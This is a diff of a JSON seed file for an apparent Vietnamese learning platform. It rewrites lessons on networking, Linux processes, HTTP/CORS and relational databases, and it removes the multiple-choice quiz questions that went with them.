@@ -7,57 +7,8 @@
       "title": "Internet & Mô hình Mạng cơ bản (IP, DNS, TCP/UDP)",
       "tier": 1,
       "prerequisites": [],
-      "lesson_markdown": "## 1. Kiến trúc Internet, Địa chỉ IP & Phân giải tên miền DNS\n\nMọi hệ thống Backend đều giao tiếp qua hạ tầng mạng liên kết toàn cầu:\n- **IP Address (IPv4 / IPv6):** Định danh logic cho mỗi thiết bị hoặc container trên mạng.\n- **DNS (Domain Name System):** Ánh xạ tên miền dễ nhớ (`api.plumora.local`) sang địa chỉ IP thông qua chuỗi phân giải `Root -> TLD -> Authoritative Name Server`.\n\n```sql\n-- Ví dụ kiểm tra kết nối socket tới cổng PostgreSQL (TCP 5432)\nSELECT inet_server_addr(), inet_server_port();\n```\n\n## 2. Giao thức Tầng Giao vận: TCP vs UDP\n\n| Tiêu chí | TCP (Transmission Control Protocol) | UDP (User Datagram Protocol) |\n| --- | --- | --- |\n| Thiết lập kết nối | Bắt tay 3 bước (`SYN -> SYN-ACK -> ACK`) | Không kết nối (Connectionless) |\n| Độ tin cậy & Thứ tự | Đảm bảo gửi đủ gói tin, đúng thứ tự, có kiểm soát tắc nghẽn | Gửi nhanh tối đa, chấp nhận rớt gói |\n| Ứng dụng Backend | HTTP/1.1, HTTP/2, kết nối Database (`PostgreSQL`, `Redis`) | DNS truy vấn nhanh, Video Streaming, HTTP/3 (QUIC) |",
-      "questions": [
-        {
-          "id": "00000000-0000-4000-8000-000000000001",
-          "display_order": 1,
-          "prompt": "Quá trình bắt tay 3 bước (Three-way Handshake) của giao thức TCP diễn ra theo trình tự gói tin nào?",
-          "options": {
-            "A": "ACK -> SYN -> FIN",
-            "B": "SYN -> SYN-ACK -> ACK",
-            "C": "GET -> POST -> ACK",
-            "D": "UDP -> TCP -> TLS"
-          },
-          "correct_option_key": "B"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000002",
-          "display_order": 2,
-          "prompt": "Thành phần nào trong hạ tầng Internet chịu trách nhiệm phân giải tên miền (Domain Name) thành địa chỉ IP?",
-          "options": {
-            "A": "Hệ thống phân giải tên miền DNS (Domain Name System)",
-            "B": "Bảng định tuyến ARP nội bộ",
-            "C": "Trình biên dịch SQL Query Planner",
-            "D": "Bộ nhớ đệm CPU L1 Cache"
-          },
-          "correct_option_key": "A"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000003",
-          "display_order": 3,
-          "prompt": "Vì sao kết nối từ Backend tới cơ sở dữ liệu PostgreSQL sử dụng giao thức TCP thay vì UDP thô?",
-          "options": {
-            "A": "Vì TCP chỉ hoạt động ở tầng Vật lý (Physical Layer)",
-            "B": "Vì TCP không cần thiết lập kết nối trước khi truyền",
-            "C": "Vì UDP tự động mã hóa toàn bộ câu lệnh SQL",
-            "D": "Vì TCP đảm bảo truyền tin cậy, đúng thứ tự và không mất dữ liệu giao dịch"
-          },
-          "correct_option_key": "D"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000004",
-          "display_order": 4,
-          "prompt": "Cặp thông tin nào xác định duy nhất một đầu cuối giao tiếp (Socket Endpoint) trên máy chủ Backend?",
-          "options": {
-            "A": "Địa chỉ MAC của thanh RAM",
-            "B": "Chỉ riêng tên miền (Hostname) không kèm cổng",
-            "C": "Địa chỉ IP kết hợp với số hiệu Cổng (Port Number) và giao thức giao vận",
-            "D": "Mã băm SHA-256 của mật khẩu người dùng"
-          },
-          "correct_option_key": "C"
-        }
-      ]
+      "lesson_markdown": "## 1. Mô hình Tư duy & Bài toán Thực tế\n\nMỗi lần người dùng gõ `https://app.plumora.vn` vào thanh địa chỉ trình duyệt, trước khi một byte HTML hay JavaScript nào được tải về, trình duyệt phải đi qua chuỗi thiết lập mạng đa tầng: **Phân giải tên miền (DNS Lookup) → Bắt tay TCP 3 bước (TCP 3-Way Handshake) → Đàm phán mã hóa TLS (TLS Handshake)**. Trong các ứng dụng Web hiện đại thường gọi đồng thời nhiều nguồn tài nguyên (API, CDN ảnh, Google Fonts), mỗi kết nối mạng mới có thể tiêu tốn 100–300ms độ trễ khứ hồi (RTT), ảnh hưởng trực tiếp đến chỉ số **TTFB (Time To First Byte)** và **LCP (Largest Contentful Paint)**.\n\n## 2. Cơ chế Hoạt động Tầng sâu\n\n- **Chuỗi phân giải DNS:** Trình duyệt kiểm tra bộ nhớ đệm theo thứ tự: `Browser DNS Cache → OS Hosts/Resolver → Recursive Resolver (ISP/1.1.1.1) → Root → TLD (.vn) → Authoritative Name Server`.\n- **TCP 3-Way Handshake & Slow Start:** Client gửi `SYN`, Server phản hồi `SYN-ACK`, Client xác nhận `ACK`. Sau khi kết nối mở, cơ chế **TCP Slow Start** chỉ gửi một cửa sổ tắc nghẽn nhỏ (thường ~14KB trong vòng RTT đầu tiên), do đó phần Critical CSS và HTML ban đầu cần được nén gọn dưới 14KB để hiển thị tức thì.\n- **HTTP/3 (QUIC trên UDP):** Thay vì TCP truyền thống bị nghẽn đầu hàng ở tầng giao vận (Head-of-Line Blocking khi rớt 1 gói tin), QUIC chạy trên UDP giúp gộp bắt tay kết nối + TLS chỉ còn 1-RTT (hoặc 0-RTT khi kết nối lại).\n\n## 3. Ví dụ Mã nguồn Thực chiến\n\n```html\n<!-- Tối ưu độ trễ mạng phía trình duyệt bằng Resource Hints -->\n<head>\n  <!-- 1. Thiết lập trước DNS + TCP + TLS cho origin quan trọng nhất -->\n  <link rel=\"preconnect\" href=\"https://api.plumora.vn\" crossorigin />\n  <!-- 2. Chỉ phân giải DNS trước cho các domain phụ (CDN, Analytics) -->\n  <link rel=\"dns-prefetch\" href=\"https://cdn.plumora.vn\" />\n  <!-- 3. Tải trước tài nguyên tối quan trọng của màn hình đầu tiên -->\n  <link rel=\"preload\" href=\"/fonts/inter-var.woff2\" as=\"font\" type=\"font/woff2\" crossorigin />\n</head>\n```\n\n```javascript\n// Đo lường thực tế DNS, TCP, TLS và TTFB bằng Navigation Timing API\nconst [nav] = performance.getEntriesByType('navigation');\nconsole.table({\n  dnsMs: Math.round(nav.domainLookupEnd - nav.domainLookupStart),\n  tcpMs: Math.round(nav.connectEnd - nav.connectStart),\n  tlsMs: Math.round(nav.connectEnd - nav.secureConnectionStart),\n  ttfbMs: Math.round(nav.responseStart - nav.requestStart),\n});\n```\n\n## 4. Các Sự cố & Bẫy Phổ biến\n\n- **Lạm dụng quá nhiều `preconnect`:** Mỗi thẻ `preconnect` mở sẵn một socket TCP/TLS tiêu tốn CPU và băng thông. Chỉ nên dùng cho 2–4 origin tối quan trọng; quá nhiều sẽ làm chậm tải tài nguyên chính.\n- **Thiếu thuộc tính `crossorigin`:** Với font hoặc API có CORS, nếu `<link rel=\"preconnect\">` thiếu `crossorigin`, trình duyệt sẽ mở một kết nối không CORS rồi lại mở thêm kết nối thứ hai có CORS.\n\n## 5. Bảng Đánh đổi Kiến trúc\n\n| Giao thức / Kỹ thuật | Ưu điểm phía Frontend | Đánh đổi & Khi nào dùng |\n| --- | --- | --- |\n| **TCP + HTTP/2** | Ghép kênh (Multiplexing) nhiều request trên 1 kết nối TCP, hỗ trợ rộng rãi | Rớt 1 gói tin làm nghẽn toàn bộ stream (TCP Head-of-Line Blocking) |\n| **UDP + HTTP/3 (QUIC)** | Chống nghẽn đầu hàng, chuyển mạng Wi-Fi → 4G mượt mà (Connection Migration) | Một số tường lửa doanh nghiệp chặn UDP cổng 443, cần fallback sang HTTP/2 |\n| **`preconnect` vs `dns-prefetch`** | `preconnect` tiết kiệm trọn DNS+TCP+TLS; `dns-prefetch` nhẹ hơn nhiều | Dùng `preconnect` cho API/CDN chính, `dns-prefetch` cho các miền phụ |",
+      "is_shared": true
     },
     {
       "action_id": 1,
@@ -65,57 +16,8 @@
       "title": "Hệ điều hành, Process/Thread & I/O cơ bản",
       "tier": 1,
       "prerequisites": [],
-      "lesson_markdown": "## 1. Tiến trình (Process) và Luồng (Thread)\n\n| Tiêu chí so sánh | Tiến trình (Process) | Luồng (Thread) |\n| --- | --- | --- |\n| Cấp phát tài nguyên | Không gian bộ nhớ ảo (Virtual Memory) độc lập | Dùng chung vùng nhớ Heap của Process cha |\n| Chi phí khởi tạo | Cao, nhân bản bảng trang bộ nhớ (Page Tables) | Thấp, chỉ khởi tạo ngăn xếp (Stack) riêng |\n| Cơ chế giao tiếp | IPC (Pipes, Sockets, Shared Memory) | Truy cập trực tiếp biến dùng chung trong Heap |\n| Mức độ an toàn | Cô lập lỗi, crash một process không ảnh hưởng process khác | Lỗi bộ nhớ trong một thread có thể sập cả process |\n\n## 2. Mô hình Non-blocking I/O & Event Loop trong Backend\n\n```python\nimport asyncio\n\nasync def handle_backend_io():\n    # Nhường quyền CPU cho Event Loop trong khi chờ I/O mạng hoặc Database\n    reader, writer = await asyncio.open_connection(\"127.0.0.1\", 5432)\n    # Non-blocking: một luồng có thể phục vụ đồng thời hàng nghìn kết nối\n    return \"Connected to PostgreSQL via Event Loop\"\n```\n\n- **Blocking I/O:** Luồng bị treo (blocked) chờ đến khi Kernel đọc/ghi xong socket hoặc đĩa.\n- **Event Loop (`epoll` / `asyncio`):** Xử lý bất đồng bộ thông qua bộ đa hợp I/O, giải quyết triệt để vấn đề C10K trong dịch vụ Backend hiện đại.",
-      "questions": [
-        {
-          "id": "00000000-0000-4000-8000-000000000101",
-          "display_order": 1,
-          "prompt": "Điểm khác biệt cốt lõi về bộ nhớ giữa hai Tiến trình (Processes) độc lập và hai Luồng (Threads) trong cùng một tiến trình là gì?",
-          "options": {
-            "A": "Mỗi Thread yêu cầu một máy ảo vật lý riêng biệt",
-            "B": "Các Thread không thể đọc biến toàn cục của Process chứa nó",
-            "C": "Các Process có không gian bộ nhớ ảo cô lập, còn các Thread trong cùng Process chia sẻ vùng nhớ chung",
-            "D": "Process không được hệ điều hành cấp phát File Descriptor"
-          },
-          "correct_option_key": "C"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000102",
-          "display_order": 2,
-          "prompt": "Cơ chế Non-blocking I/O kết hợp Event Loop (như trong Uvicorn/FastAPI async) giúp tối ưu hiệu năng khi nào?",
-          "options": {
-            "A": "Khi cần tắt hoàn toàn bộ lập lịch của nhân Linux",
-            "B": "Khi chỉ chạy một vòng lặp nhân ma trận thuần CPU không có I/O",
-            "C": "Khi máy chủ không có kết nối mạng",
-            "D": "Khi ứng dụng có nhiều tác vụ chờ mạng/cơ sở dữ liệu (I/O-bound) đồng thời"
-          },
-          "correct_option_key": "D"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000103",
-          "display_order": 3,
-          "prompt": "Hiện tượng Race Condition xảy ra khi nào trong lập trình đa luồng?",
-          "options": {
-            "A": "Khi nhiều luồng cùng đọc và ghi vào một tài nguyên dùng chung mà không có cơ chế đồng bộ (Lock/Mutex)",
-            "B": "Khi mỗi luồng chỉ thao tác trên biến cục bộ trong Stack riêng",
-            "C": "Khi CPU có tốc độ xung nhịp cao hơn ổ cứng SSD",
-            "D": "Khi chương trình chỉ chạy trên duy nhất 1 luồng tuần tự"
-          },
-          "correct_option_key": "A"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000104",
-          "display_order": 4,
-          "prompt": "Chuyển ngữ cảnh (Context Switch) quá dày đặc giữa hàng chục nghìn luồng hệ điều hành gây tác hại gì?",
-          "options": {
-            "A": "Làm tăng dung lượng ổ cứng vật lý",
-            "B": "Tốn chi phí CPU lưu/nạp thanh ghi và làm giảm hiệu quả bộ nhớ đệm (CPU Cache)",
-            "C": "Tự động xóa các bảng trong PostgreSQL",
-            "D": "Biến giao thức TCP thành UDP"
-          },
-          "correct_option_key": "B"
-        }
-      ]
+      "lesson_markdown": "## 1. Mô hình Tư duy & Bài toán Thực tế\n\nMọi container Docker hay Pod Kubernetes trên production thực chất đều là **các tiến trình Linux thông thường** chạy trực tiếp trên cùng một nhân hệ điều hành (Linux Kernel). Khi một dịch vụ đột ngột bị khởi động lại với mã thoát `Exit Code 137`, treo không nhả kết nối khi triển khai bản mới, hoặc báo lỗi `Too many open files`, kỹ sư DevOps không thể chỉ nhìn log ứng dụng mà phải chẩn đoán trực tiếp cơ chế quản lý tiến trình, tín hiệu (Signals), bộ nhớ ảo (Virtual Memory) và bảng File Descriptor của Linux.\n\n## 2. Cơ chế Hoạt động Tầng sâu\n\n- **Vòng đời Tiến trình & Tín hiệu Tắt êm ái (Graceful Shutdown):** Khi Kubernetes dừng một Pod, nó gửi tín hiệu **`SIGTERM` (15)** để tiến trình có thời gian (mặc định 30 giây) xử lý nốt các HTTP request đang dở và đóng kết nối DB. Nếu tiến trình phớt lờ `SIGTERM` (thường gặp khi chạy qua shell script mà không dùng `exec`), Kernel sẽ gửi **`SIGKILL` (9)** diệt tiến trình ngay lập tức (Exit Code 137).\n- **OOM Killer (Out-Of-Memory):** Khi container sử dụng bộ nhớ vượt ngưỡng `memory.limit` trong Cgroup, nhân Linux kích hoạt OOM Killer chấm dứt tiến trình tiêu tốn RAM cao nhất (Exit Code 137) để bảo vệ toàn bộ máy chủ node.\n- **File Descriptors (`ulimit -n`):** Trong Linux, mọi thứ từ tệp tin, đường ống (pipe) đến **socket TCP** đều là một File Descriptor (FD). Giới hạn mặc định 1024 FD rất dễ bị cạn kiệt dưới tải cao nếu không tăng `nofile` limit.\n\n## 3. Ví dụ Mã nguồn Thực chiến\n\n```bash\n# 1. Kiểm tra giới hạn File Descriptors và số lượng socket đang mở của tiến trình API\nulimit -n\nls -l /proc/$(pgrep -f uvicorn | head -n 1)/fd | wc -l\n\n# 2. Kiểm tra nhật ký nhân Linux tìm sự cố OOM Killer (Exit Code 137)\ndmesg -T | grep -iE \"killed process|oom\"\n\n# 3. Đảm bảo PID 1 nhận trực tiếp SIGTERM trong Dockerfile entrypoint\n# SAI:  CMD uvicorn app.main:app --host 0.0.0.0 --port 8000 (sinh tiến trình /bin/sh trung gian)\n# ĐÚNG: Exec form để ứng dụng chạy ở PID 1 và nhận SIGTERM trực tiếp\nexec uvicorn app.main:app --host 0.0.0.0 --port 8000\n```\n\n## 4. Các Sự cố & Bẫy Phổ biến\n\n- **Bẫy PID 1 trong Container (Shell Form vs Exec Form):** Viết `CMD python app.py` (Shell form) khiến `/bin/sh` giữ PID 1 và không chuyển tiếp tín hiệu `SIGTERM` cho Python, làm mỗi lần deploy phải chờ hết 30s rồi bị giết đột ngột bằng `SIGKILL`, gây rớt kết nối người dùng (HTTP 502).\n- **Rò rỉ Zombie Process:** Tiến trình con kết thúc nhưng tiến trình cha không gọi `wait()` để thu gom trạng thái thoát sẽ làm cạn kiệt bảng PID (`pids_limit`).\n\n## 5. Bảng Đánh đổi Kiến trúc\n\n| Cơ chế Linux | Tác dụng vận hành | Đánh đổi & Lưu ý thực tế |\n| --- | --- | --- |\n| **`SIGTERM` (Graceful Shutdown)** | Bảo toàn giao dịch đang chạy, 0% rớt request khi Rolling Update | Ứng dụng phải chủ động bắt signal và ngừng nhận kết nối mới |\n| **Tăng `ulimit -n` (FD Limit)** | Cho phép máy chủ chịu tải hàng chục nghìn kết nối đồng thời | Tăng lượng bộ nhớ Kernel cấp phát cho bảng socket mở |\n| **Swap bật vs tắt trên Node K8s** | Tắt Swap giúp độ trễ ổn định và OOM phát hiện lỗi rò rỉ RAM nhanh | Nếu thiếu RAM đột biến, Pod sẽ bị OOMKill ngay thay vì chạy chậm |",
+      "is_shared": true
     },
     {
       "action_id": 2,
@@ -125,57 +27,8 @@
       "prerequisites": [
         0
       ],
-      "lesson_markdown": "## 1. Cấu trúc Thông điệp HTTP & Tính chất Idempotent\n\n| Phương thức (Method) | Tính An toàn (Safe) | Tính Lũy đẳng (Idempotent) | Ứng dụng Backend Chuẩn |\n| --- | --- | --- | --- |\n| `GET` | Có (Không đổi trạng thái) | Có (Gọi nhiều lần kết quả như một) | Đọc dữ liệu tài nguyên (`/api/v1/roadmap`) |\n| `POST` | Không (Tạo mới tài nguyên) | Không (Mỗi lần gọi sinh bản ghi mới) | Gửi nộp bài thi (`/attempts`), Đăng nhập |\n| `PUT` | Không (Sửa tài nguyên) | Có (Ghi đè toàn bộ tài nguyên đích) | Cập nhật cấu hình toàn diện người dùng |\n| `PATCH` | Không (Sửa một phần) | Thường không (Tùy thuộc nghiệp vụ) | Cập nhật một số trường dữ liệu lẻ |\n| `DELETE` | Không (Xóa tài nguyên) | Có (Xóa một tài nguyên đã mất) | Hủy phiên làm việc hoặc tài khoản |\n\n## 2. Cấu trúc Giao thức & Bảo mật HTTPS / TLS\n\n```http\nPOST /api/v1/auth/login HTTP/1.1\nHost: 127.0.0.1:8000\nContent-Type: application/json\nUser-Agent: PlumoraClient/1.0.0\n\n{\"username\": \"learner_foundation\", \"password\": \"***\"}\n```\n\n- **HTTPS / TLS:** Bọc phiên truyền thông bên trong tầng mã hóa TLS, đảm bảo tính bí mật, chống giả mạo gói tin (Tampering / MITM) và xác thực danh tính máy chủ thông qua chứng chỉ số X.509.",
-      "questions": [
-        {
-          "id": "00000000-0000-4000-8000-000000000201",
-          "display_order": 1,
-          "prompt": "Cặp mã trạng thái HTTP nào phân biệt đúng trường hợp 'Chưa xác thực danh tính' và 'Đã xác thực nhưng không đủ quyền truy cập'?",
-          "options": {
-            "A": "401 Unauthorized (chưa xác thực) và 403 Forbidden (không đủ quyền)",
-            "B": "200 OK và 201 Created",
-            "C": "404 Not Found và 500 Internal Server Error",
-            "D": "301 Moved Permanently và 304 Not Modified"
-          },
-          "correct_option_key": "A"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000202",
-          "display_order": 2,
-          "prompt": "Phương thức HTTP nào được định nghĩa theo chuẩn RFC là vừa An toàn (Safe - không làm thay đổi trạng thái server) vừa Lũy đẳng (Idempotent)?",
-          "options": {
-            "A": "PATCH",
-            "B": "POST",
-            "C": "GET",
-            "D": "CONNECT"
-          },
-          "correct_option_key": "C"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000203",
-          "display_order": 3,
-          "prompt": "Thuộc tính nào trên Set-Cookie header ngăn không cho mã JavaScript phía trình duyệt (`document.cookie`) đọc trộm token phiên?",
-          "options": {
-            "A": "Content-Length",
-            "B": "HttpOnly",
-            "C": "Accept-Encoding",
-            "D": "User-Agent"
-          },
-          "correct_option_key": "B"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000204",
-          "display_order": 4,
-          "prompt": "Lớp TLS trong giao thức HTTPS bảo vệ dữ liệu trên đường truyền khỏi nguy cơ nào?",
-          "options": {
-            "A": "Người dùng quên mật khẩu cá nhân",
-            "B": "Lỗi cú pháp SQL bên trong mã nguồn Python",
-            "C": "Đầy ổ cứng do ghi log quá nhiều",
-            "D": "Nghe lén (Eavesdropping) và sửa đổi gói tin trái phép (Tampering / MITM)"
-          },
-          "correct_option_key": "D"
-        }
-      ]
+      "lesson_markdown": "## 1. Mô hình Tư duy & Bài toán Thực tế\n\nPhía Frontend giao tiếp với Backend thông qua các thông điệp HTTP/HTTPS có cấu trúc chặt chẽ. Khác với `curl` hay Postman, trình duyệt áp đặt một lớp rào chắn bảo mật cực kỳ quan trọng là **Same-Origin Policy (SOP)** nhằm ngăn trang web độc hại đọc trộm dữ liệu từ API của ngân hàng hay hệ thống nội bộ mà người dùng đang đăng nhập. Để ứng dụng SPA (`https://app.plumora.vn`) gọi hợp pháp sang API khác miền (`https://api.plumora.vn`), lập trình viên Frontend và Backend phải hiểu chính xác cơ chế **CORS (Cross-Origin Resource Sharing)** và **HTTP Caching**.\n\n## 2. Cơ chế Hoạt động Tầng sâu\n\n- **Origin là bộ 3 `(Scheme, Host, Port)`:** `http://localhost:5173` và `http://localhost:8000` là **khác Origin** vì khác cổng.\n- **CORS Preflight (`OPTIONS`):** Với các request không đơn giản (ví dụ `Content-Type: application/json`, phương thức `PUT`/`DELETE`, hoặc có header tùy biến `Authorization`/`X-CSRF-Token`), trình duyệt tự động gửi một request `OPTIONS` hỏi trước server. Chỉ khi server trả về `Access-Control-Allow-Origin`, `Access-Control-Allow-Methods` và `Access-Control-Allow-Headers` khớp chính xác, trình duyệt mới gửi request thật.\n- **HTTP Caching (`Cache-Control` & `ETag`):** Trình duyệt lưu phản hồi tĩnh theo `Cache-Control: max-age=31536000, immutable` (cho file JS/CSS có hash tên) hoặc xác thực điều kiện bằng `If-None-Match: <ETag>` để server trả `304 Not Modified` không cần gửi lại thân dữ liệu.\n\n## 3. Ví dụ Mã nguồn Thực chiến\n\n```typescript\n// Gọi API có gửi kèm HttpOnly Cookie xuyên Origin & xử lý mã lỗi HTTP chuẩn\nexport async function fetchProtectedResource<T>(url: string, signal?: AbortSignal): Promise<T> {\n  const response = await fetch(url, {\n    method: 'GET',\n    credentials: 'include', // Bắt buộc để trình duyệt đính kèm HttpOnly Cookie\n    headers: { Accept: 'application/json' },\n    signal,\n  });\n\n  if (response.status === 401) {\n    throw new Error('AUTH_REQUIRED: Phiên đăng nhập đã hết hạn.');\n  }\n  if (response.status === 403) {\n    throw new Error('FORBIDDEN: Không đủ quyền truy cập tài nguyên này.');\n  }\n  if (!response.ok) {\n    const body = await response.json().catch(() => ({}));\n    throw new Error(body?.detail?.message ?? `HTTP_${response.status}`);\n  }\n  return (await response.json()) as T;\n}\n```\n\n## 4. Các Sự cố & Bẫy Phổ biến\n\n- **Dùng `Access-Control-Allow-Origin: *` cùng với `credentials: 'include'`:** Chuẩn Fetch của trình duyệt **cấm tuyệt đối** tổ hợp này và lập tức chặn phản hồi bằng lỗi CORS. Server bắt buộc phải trả về Origin cụ thể (ví dụ `http://localhost:5173`) kèm `Access-Control-Allow-Credentials: true`.\n- **Cache nhầm file `index.html`:** Đặt `max-age` quá dài cho `index.html` khiến người dùng tải bản HTML cũ trỏ tới các chunk JS đã bị xóa sau khi deploy bản mới.\n\n## 5. Bảng Đánh đổi Kiến trúc\n\n| Chiến lược HTTP | Lợi ích cho Frontend | Đánh đổi & Phạm vi áp dụng |\n| --- | --- | --- |\n| **`Cache-Control: immutable`** | 0 request mạng cho JS/CSS đã có content-hash | Phải đổi tên file hash ở mỗi lần build |\n| **`ETag` + `no-cache`** | Luôn đảm bảo dữ liệu mới nhất, tiết kiệm băng thông qua `304` | Vẫn tốn 1 vòng RTT mạng để hỏi server xác thực |\n| **Same-Origin Reverse Proxy (`/api`)** | Tránh hoàn toàn độ trễ Preflight `OPTIONS` và rắc rối CORS Cookie | Yêu cầu cấu hình Nginx/API Gateway định tuyến chung miền |",
+      "is_shared": true
     },
     {
       "action_id": 3,
@@ -185,57 +38,8 @@
       "prerequisites": [
         1
       ],
-      "lesson_markdown": "## 1. Mô hình Quan hệ & Ràng buộc Toàn vẹn Dữ liệu\n\n| Loại ràng buộc | Mục đích Kỹ thuật | Ví dụ trong CSDL Plumora |\n| --- | --- | --- |\n| `PRIMARY KEY` (`PK`) | Định danh duy nhất mỗi hàng dữ liệu | `users.id UUID PRIMARY KEY` |\n| `FOREIGN KEY` (`FK`) | Bảo đảm toàn vẹn tham chiếu giữa các bảng | `user_concept_mastery.user_id -> users.id` |\n| `UNIQUE` | Ngăn chặn trùng lặp dữ liệu trên tập cột | `UNIQUE (user_id, submission_id)` chống nộp trùng |\n| `CHECK` | Ràng buộc miền giá trị hợp lệ của cột | `CHECK (0.0 <= mastery_score <= 1.0)` |\n\n## 2. Định nghĩa Bảng Chuẩn trong PostgreSQL\n\n```sql\nCREATE TABLE user_concept_mastery (\n    user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,\n    concept_action_id INT NOT NULL REFERENCES concepts(action_id),\n    mastery_score NUMERIC(5, 4) NOT NULL CHECK (mastery_score >= 0.0 AND mastery_score <= 1.0),\n    is_mastered BOOLEAN NOT NULL DEFAULT FALSE,\n    updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),\n    PRIMARY KEY (user_id, concept_action_id)\n);\n```",
-      "questions": [
-        {
-          "id": "00000000-0000-4000-8000-000000000301",
-          "display_order": 1,
-          "prompt": "Ràng buộc Khóa ngoại (Foreign Key) trong cơ sở dữ liệu quan hệ nhằm đảm bảo tính chất nào?",
-          "options": {
-            "A": "Thay thế hoàn toàn nhu cầu dùng câu lệnh SELECT",
-            "B": "Tự động nén toàn bộ cột văn bản thành ảnh PNG",
-            "C": "Cho phép lưu các giá trị trùng lặp trong cột Primary Key",
-            "D": "Toàn vẹn tham chiếu (Referential Integrity) giữa bảng con và bảng cha"
-          },
-          "correct_option_key": "D"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000302",
-          "display_order": 2,
-          "prompt": "Trong câu truy vấn SQL, mệnh đề nào dùng để lọc kết quả sau khi đã gom nhóm bằng `GROUP BY`?",
-          "options": {
-            "A": "ORDER BY",
-            "B": "HAVING",
-            "C": "OFFSET",
-            "D": "TRUNCATE"
-          },
-          "correct_option_key": "B"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000303",
-          "display_order": 3,
-          "prompt": "Phép kết nối `LEFT JOIN` giữa bảng `concepts` (trái) và `user_concept_mastery` (phải) trả về kết quả như thế nào?",
-          "options": {
-            "A": "Xóa các dòng ở bảng bên trái nếu bảng bên phải rỗng",
-            "B": "Chỉ trả về các dòng không khớp ở cả hai bảng",
-            "C": "Trả về toàn bộ các dòng của bảng `concepts` cùng dữ liệu khớp ở bảng phải (hoặc NULL nếu chưa có)",
-            "D": "Nhân Đề-các vô điều kiện mọi dòng của hai bảng"
-          },
-          "correct_option_key": "C"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000304",
-          "display_order": 4,
-          "prompt": "Ràng buộc `UNIQUE (user_id, submission_id)` trên bảng `quiz_attempts` có tác dụng gì?",
-          "options": {
-            "A": "Đảm bảo một người học không thể tạo hai bản ghi kết quả trùng lặp cho cùng một `submission_id`",
-            "B": "Giới hạn mỗi người học chỉ được làm duy nhất 1 câu hỏi trong suốt khóa học",
-            "C": "Tự động xóa tài khoản người dùng sau khi nộp bài",
-            "D": "Cấm hai người học khác nhau làm cùng một bài học"
-          },
-          "correct_option_key": "A"
-        }
-      ]
+      "lesson_markdown": "## 1. Mô hình Tư duy & Bài toán Thực tế\n\nCơ sở dữ liệu quan hệ (PostgreSQL, MySQL) là xương sống của phần lớn hệ thống Backend yêu cầu tính nhất quán dữ liệu cao như tài chính, thương mại điện tử và quản lý học tập. Khi bảng `attempt_records` hoặc `orders` phình lên hàng chục triệu dòng, một câu truy vấn thiếu chỉ mục (`Sequential Scan`) hoặc thiết kế khóa ngoại thiếu ràng buộc có thể đẩy CPU lên 100%, gây nghẽn toàn bộ Connection Pool và làm sập cả API Gateway.\n\n## 2. Cơ chế Hoạt động Tầng sâu\n\n- **Chuẩn hóa (Normalization 1NF–3NF) & Ràng buộc toàn vẹn:** Tách bảng theo thực thể để tránh dị thường cập nhật (`Update/Delete Anomaly`), dùng `PRIMARY KEY`, `FOREIGN KEY` (`ON DELETE RESTRICT` hoặc `CASCADE` có chủ đích), `UNIQUE`, `CHECK` để PostgreSQL tự bảo vệ bất biến dữ liệu ngay ở tầng lưu trữ.\n- **Cấu trúc B-Tree Index & Composite Index:** B-Tree giữ khóa theo thứ tự tăng dần giúp tìm kiếm `O(log N)`. Với Composite Index `(user_id, created_at DESC)`, quy tắc **Leftmost Prefix** cho phép tăng tốc truy vấn lọc theo `user_id` hoặc `(user_id, created_at)`, nhưng vô dụng nếu chỉ lọc theo `created_at`.\n- **Covering Index & EXPLAIN (ANALYZE, BUFFERS):** Dùng `INCLUDE (status)` để đạt *Index-Only Scan* (không cần chạm vào Heap Table). Luôn đọc kế hoạch thực thi (`EXPLAIN ANALYZE`) để kiểm tra `Actual Rows` so với `Planned Rows`, phát hiện `Seq Scan` trên bảng lớn hoặc `Nested Loop` bất thường.\n\n## 3. Thực hành Chuẩn Production & Anti-patterns\n\n- **Anti-pattern:** Tạo Index tràn lan trên mọi cột (làm chậm `INSERT/UPDATE` vì phải cập nhật tất cả B-Tree và phình dung lượng WAL), dùng `SELECT *` kéo cả cột `JSONB/TEXT` lớn qua mạng, hoặc thiếu Index trên cột khóa ngoại (`FOREIGN KEY` trong PostgreSQL không tự tạo Index!).\n- **Chuẩn Production:**\n  - Dùng `BIGINT` hoặc `UUID` (UUIDv7 tăng dần theo thời gian để tránh phân mảnh B-Tree trang lá).\n  - Bắt buộc tạo Index trên mọi cột `FOREIGN KEY` hay tham gia `JOIN`/`WHERE`.\n  - Dùng **Partial Index** (`WHERE deleted_at IS NULL` hoặc `WHERE status = 'pending'`) cho hàng đợi Outbox để giữ kích thước Index nhỏ gọn nằm hoàn toàn trong RAM (`shared_buffers`).\n  - Dùng **Keyset Pagination** (`WHERE (created_at, id) < (:ts, :id)`) thay vì `OFFSET 100000` (vốn bắt DB đọc rồi vứt bỏ 100.000 dòng).\n\n## 4. Đánh đổi Kiến trúc (Trade-offs)\n\n| Tiêu chí | Chuẩn hóa chặt (3NF) + Joins | Phi chuẩn hóa có kiểm soát (Denormalization / Materialized) |\n| :--- | :--- | :--- |\n| **Độ toàn vẹn ghi** | Tuyệt đối, không trùng lặp dữ liệu | Phải đồng bộ nhiều chỗ (dễ lệch nếu quên) |\n| **Tốc độ đọc báo cáo** | Chậm hơn khi `JOIN` nhiều bảng lớn | Rất nhanh (`O(1)` đọc 1 bảng hoặc cột tổng hợp) |\n| **Chi phí lưu trữ** | Thấp | Cao hơn do lưu dư thừa |\n\n> **Nguyên tắc Plumora:** Luôn chuẩn hóa `3NF` cho dữ liệu giao dịch (`OLTP`) làm nguồn chân lý duy nhất (*Single Source of Truth*), chỉ phi chuẩn hóa hoặc dùng `JSONB` cho snapshot bất biến (như `response_json` của idempotency).\n\n## 5. Câu hỏi Phản tư & Kiểm chứng Nhanh\n\n1. Tại sao trong PostgreSQL, một bảng có Composite Index `(domain_slug, tier, created_at)` lại không dùng được 